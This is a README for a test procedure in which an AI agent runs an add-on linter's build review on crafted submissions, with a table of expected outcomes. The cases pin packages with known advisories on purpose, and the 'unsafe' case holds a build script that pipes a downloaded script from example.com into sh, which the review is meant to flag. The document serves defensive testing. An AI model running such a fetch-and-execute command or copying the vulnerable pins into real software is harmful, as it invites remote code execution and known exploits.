# Hot runs

A hot run is the source code review's build procedure run for real, end to end, on a real
add-on. An agent (Claude, in this repo) receives

```sh
WEBEXT_LINTER_AGENT_BUILDS=1 node verify.js <submission folder> --llm-sca-review
```

and follows every prompt with real tools: it extracts the archive, writes build.md, judges
the build, and hands back. The linter audits the lock against OSV, and the agent rescues the
copy with the real npm or pnpm and builds the add-on, as the prompts say. The agent hands
back until it reaches one of two stops, and goes no further:

- **row 14:** the Build Review Details block, the first step of `built`. The agent shows the
  block, ends its turn on it, and goes no further.
- **the abort:** the closing prompt of an aborted review. The agent stops on it.

Then it runs `check.js` on the work folder, so the verdict is the linter's state, not the
agent's word.

**Network warning.** A hot run makes real requests: the npm registry, OSV, the popularity
hosts, and whatever the add-on's own build fetches. Run it on demand only. It is never part
of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
`tests/unit/*.test.js`, and neither reaches this folder.


## Running a case

1. Pick a case from `cases.json`. Its `submission` folder holds one `.xpi` and one source
   archive. Delete any work folder an earlier run left in it.
2. Give the agent the command above with that folder. It works through the prompts until
   row 14 or the abort.
3. Run the check with the work folder the prompts named (the folder the `--llm-handback`
   commands carry):

   ```sh
   node tests/hot/check.js <case id> <work folder>
   ```

   It prints `match` and exits 0, or prints each difference and exits 1. It exits 2 when it
   cannot read the case or the folder.

`check.js` reads the review's state (`.review/state.json`) through the linter's own
readers. At row 14 it compares `BUILD_SAFETY`, the counts of `BUILD_VULNERABILITIES` the case
names, `BUILD_RESULT`, the folder `BUILD_OUTPUT` lies in (always `build`, or `false` where
the block names none) and the folder `SCA_ROOT` lies in (`sca` or `rescued`). It prints
`BUILD_MATCH` and never compares it, since a case's lock is newer than the one its XPI was
built from. Whatever the
stop, a `rescued/` in the work folder must hold no `node_modules/`, since nothing is installed
or built in it. At an
abort it settles the review as the closing prompt does, and compares the early-exit reasons
(as a set) and the error findings the case names. A run that stopped anywhere else, in the
preparation (`.review/prepare.json`) or at another phase, is a mismatch naming where it
stopped. Package versions are never compared.

A mismatch is reported with the case, the stop reached and the diff. A new advisory that
shifts a case shows as a mismatch, and the case gets a new package.


## The submissions

They live outside the repo, in `/home/john/Downloads/reviews/hot/<case id>/`. Each was made
from one of two real submissions by changing only package.json and its lock (and the file
and folder names, which are invented). The archive's own top folder was renamed to the
invented name, the source archive was repacked as a zip beside the unchanged `.xpi`, and
nothing else in the tree changed, except the pnpm setup of pnpm-reduce (below). The archives
were extracted into empty folders and none of their scripts ran while the cases were made.
Locks were generated with `npm install --package-lock-only --ignore-scripts` or
`pnpm install --lockfile-only --ignore-scripts` (npm 11.17, pnpm 11.26).

- **Base A, `issuebridge-1.2.1`:** a Vue add-on with no Experiment. Its documented release
  build is `npm ci` then `npm run build`, one `vite build` that also writes its own XPI. The
  source imports dompurify, pinia, turndown and vue, and the build uses vite and
  @vitejs/plugin-vue. Its lock was regenerated within the declared ranges on 2026-10-13: the
  lock as submitted carried six packages with high advisories published in 2026, and the
  regenerated one audits 0 moderate, 0 high, 0 critical.
- **Base B, `sendguard-4.2.5.3`:** a plain-files add-on with no Experiment, whose package.json
  sits in `webextensions/` and whose release build is a Makefile that fetches git submodules
  and zips the files. Its package.json declares no dependency here.

Packages are real and pinned, never faked. Each was confirmed against OSV
(`api.osv.dev/v1/query`) on 2026-10-13, and each case's root was audited with the
preparation's own audit (`src/prepare/audit.js` `auditRoot`). Every case's tree was also
reviewed once without an agent (`--sca-root`, the rescued trees as the rescue would leave
them), to confirm no deterministic check aborts a case that should reach row 14.

| Package | Advisory | Severity | Fixed in |
|---|---|---|---|
| lodash@4.17.20 | GHSA-35jh-r3h4-6jhm (CVE-2021-23337), also GHSA-r5fr-rjxr-66jc | high | 4.17.21, 4.18.0 |
| dompurify@3.1.2 | GHSA-mmhx-hmjr-r674 (CVE-2024-45801), GHSA-gx9m-whjm-85jf (CVE-2024-47875), each affecting `>=3.0.0 <3.1.3` | high | 3.1.3 |
| dompurify@3.1.3 | moderate and low advisories only | moderate | 3.2.4 and later |
| ms@1.0.0 | GHSA-w9mr-4mfr-499f (CVE-2017-20162), its only advisory | moderate | 2.0.0 |
| husky@9.1.7 | none | | |


## The cases

Where a build must fail, it fails for a reason the rescue's rules forbid the agent to
repair: the source imports `turndown`, and package.json no longer declares it. The rescue
may only remove dependencies, refresh the lock and apply the audit fix, so it cannot add it
back, and the build (`npm ci` then `vite build`) fails on the unresolved import. A missing
build file was not used: the extract step lists a step whose source is not in the tree as a
safety concern, and the case would end as judged unsafe instead of failed.

| id | base | package.json change | lock audit | expected stop |
|---|---|---|---|---|
| clean-builds | A | none (lock regenerated) | 0 high, 0 critical | row 14: built in `build/`, `SCA_ROOT` in `sca/` |
| clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_ROOT` in `sca/` |
| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
| reduce-fails | A | as reduce-builds, and `turndown` removed | 1 high | abort: known vulnerabilities |
| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
| fix-fails | A | as fix-builds, and `turndown` removed | 1 high | abort: known vulnerabilities |
| fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities |
| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` |
| moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
| unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | 0 high, 0 critical | row 14: not built, judged unsafe |
| not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | abort: build issues (`sca-lock-file-multiple`) |
| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_ROOT` in `rescued/` (the pnpm commands) |

Each case, and why it lands where it does:

- **reduce-builds, reduce-fails, pnpm-reduce:** lodash is pinned exactly, so the audit fix has
  no release to move to. Only removing it, as a dependency the release build does not use,
  clears the lock. Confirmed in a scratch copy: with lodash removed and the lock refreshed
  (npm, and pnpm for pnpm-reduce), the audit reads 0 high, 0 critical.
- **pnpm-reduce** is set up as a current pnpm project must be: it pins its pnpm release and
  approves its dependencies' install scripts.
- **fix-builds, fix-fails:** dompurify is imported by the source, so it stays. Its range is
  capped at 3.1.3, the release that fixes both high advisories, so no later release can be
  picked. Confirmed in a scratch copy: `npm audit fix --package-lock-only --ignore-scripts`
  moves it to 3.1.3, and the audit then reads 1 moderate, 0 high, 0 critical.
- **fix-impossible:** every release in `>=3.0.0 <=3.1.2` is affected by both high advisories,
  and the lock already holds the highest. Confirmed: the audit fix leaves 3.1.2 in place. The
  source imports dompurify, so removing it fails the build as well, and the rescue fails
  either way. An abandoned package with no fixed release could not be used: only
  package.json and the lock change, so the dependency the build uses has to be one the
  source already imports.
- **husky-trap:** the rescue trims dev tooling, husky among it (git hooks), and `npm ci` then
  fails on `prepare: husky` (exit 127). The agent has to keep husky or remove the script. With
  husky present, `prepare` passes: husky 9.1.7 prints that `.git` cannot be found and exits 0
  outside a git repository (read from its bin.js, not run).
- **moderate-only:** ms@1.0.0 is unused and its only advisory is moderate, so the lock is
  clean and the original is built without a rescue. dompurify's frequent new advisories are
  the likely drift here: one on the regenerated release would make the count 2.
- **unsafe:** the build script pipes a downloaded script into `sh`. The URL is never fetched:
  the judgement ends the preparation before anything runs.
- **not-auditable:** two lock files. The preparation does not audit such a lock, and the
  review aborts on `sca-lock-file-multiple`. Both locks are empty, so no vulnerability check
  adds a reason, whatever the agent judges the Makefile's submodule fetch to be.

To rebuild a case: extract the base's original archive into an empty folder, rename its top
folder, regenerate the base A lock (`npm install --package-lock-only --ignore-scripts` after
deleting it), apply the package.json change from the table, refresh the lock the same way
(for a fenced range, first lock the exact release, then write the range and refresh again,
which keeps it), and zip the top folder beside the `.xpi`.
